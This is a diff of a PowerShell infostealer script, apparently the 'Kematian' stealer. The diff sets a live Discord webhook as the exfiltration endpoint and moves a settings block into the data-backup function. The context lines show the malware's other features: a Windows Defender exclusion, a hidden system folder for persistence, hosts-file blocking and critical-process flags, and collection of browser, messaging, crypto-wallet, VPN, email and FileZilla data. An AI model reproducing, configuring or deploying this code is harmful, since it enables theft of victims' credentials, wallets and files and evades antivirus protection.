@@ -1,4 +1,4 @@
-$webhook = "YOUR_WEBHOOK_HERE" 
+$webhook = "https://discord.com/api/webhooks/1237238731677761609/hWwWPvpgh4OiMwyc2178X-mkRtM36A6em7ltfEVztzua2aclLP3ESsmaXNkor4udqe8E" 
 $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
@@ -78,17 +78,6 @@ function Invoke-TASKS {
     if ($persistence) {
         Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
         New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force | Out-Null
-        if (-not ($settings)) {
-            $settings = @"
-`$debug = `$$debug
-`$blockhostsfile = `$$blockhostsfile
-`$criticalprocess = `$$criticalprocess
-`$melt = `$$melt
-`$fakeerror = `$$fakeerror
-`$persistence = `$$persistence
-"@
-
-        }
         # Hidden Directory
         $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
         $KDOT_DIR.attributes = "Hidden", "System"
@@ -166,6 +155,18 @@ function Backup-Data {
     $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $filezilla_bkp)
     $folders | ForEach-Object {
         New-Item -ItemType Directory -Path $_ -Force | Out-Null
+    }
+
+    if (-not ($settings)) {
+        $settings = @"
+`$debug = `$$debug
+`$blockhostsfile = `$$blockhostsfile
+`$criticalprocess = `$$criticalprocess
+`$melt = `$$melt
+`$fakeerror = `$$fakeerror
+`$persistence = `$$persistence
+"@
+
     }
 
     #bulk data (added build ID with banner)
